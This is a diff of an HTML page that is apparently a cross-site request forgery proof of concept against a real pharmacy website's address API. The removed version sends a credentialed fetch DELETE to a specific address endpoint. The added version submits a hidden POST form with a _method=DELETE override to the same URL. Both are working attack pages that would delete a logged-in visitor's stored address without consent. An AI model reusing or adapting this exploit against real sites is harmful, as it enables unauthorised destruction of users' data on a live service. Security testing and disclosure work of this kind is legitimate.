@@ -1,22 +1,19 @@
 <!DOCTYPE html>
-<html>
-  <body>
-    <h1>Manual CSRF DELETE Trigger</h1>
-    <button onclick="triggerDelete()">Send DELETE Request</button>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC - DELETE via POST</title>
+</head>
+<body>
+  <h1>CSRF PoC - Delete Address via POST Override</h1>
+  <p>
+    Click the button below to send a <code>POST</code> request with a hidden field
+    <code>_method=DELETE</code>. This relies on the server honoring method override.
+  </p>
 
-    <script>
-      function triggerDelete() {
-        fetch("https://www.redcare-pharmacie.fr/webclient/api/cacheable/addresses/v2/fr/685fafd2602f60227d1bb947", {
-          method: "DELETE",
-          credentials: "include", // required to send cookies
-          headers: {
-            "Accept": "application/json",
-            "Content-Type": "application/json"
-          }
-        }).then(response => response.text())
-          .then(data => console.log("Response:", data))
-          .catch(err => console.error("Error:", err));
-      }
-    </script>
-  </body>
+  <form method="POST" action="https://www.redcare-pharmacie.fr/webclient/api/cacheable/addresses/v2/fr/685fafd2602f60227d1bb947">
+    <input type="hidden" name="_method" value="DELETE">
+    <input type="submit" value="Try Delete via POST">
+  </form>
+</body>
 </html>
